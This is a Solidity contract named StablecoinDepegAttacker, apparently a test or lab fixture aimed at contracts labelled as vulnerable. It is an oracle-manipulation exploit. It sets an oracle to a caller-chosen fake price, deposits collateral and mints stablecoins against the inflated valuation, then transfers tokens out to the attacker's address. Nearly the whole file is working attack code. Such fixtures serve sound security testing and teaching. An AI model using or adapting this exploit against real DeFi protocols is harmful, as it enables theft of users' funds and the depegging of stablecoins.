// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableOracle {
    function setPrice(uint256 _price) external;
}

interface IVulnerableStablecoin {
    function depositCollateral(uint256 amount) external;
    function mint(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract StablecoinDepegAttacker {
    address public owner;
    uint256 public stablecoinsMinted;
    bool public oracleManipulated;
    bool public collateralWithdrawn;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function manipulateOracle(address oracle, uint256 fakePrice) external onlyOwner {
        IVulnerableOracle(oracle).setPrice(fakePrice);
        oracleManipulated = true;
    }

    function depositAndMint(
        address stablecoin,
        address collateralToken,
        uint256 collateralAmount,
        uint256 mintAmount
    ) external onlyOwner {
        IERC20Minimal(collateralToken).approve(stablecoin, collateralAmount);
        IVulnerableStablecoin(stablecoin).depositCollateral(collateralAmount);
        IVulnerableStablecoin(stablecoin).mint(mintAmount);
        stablecoinsMinted += mintAmount;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
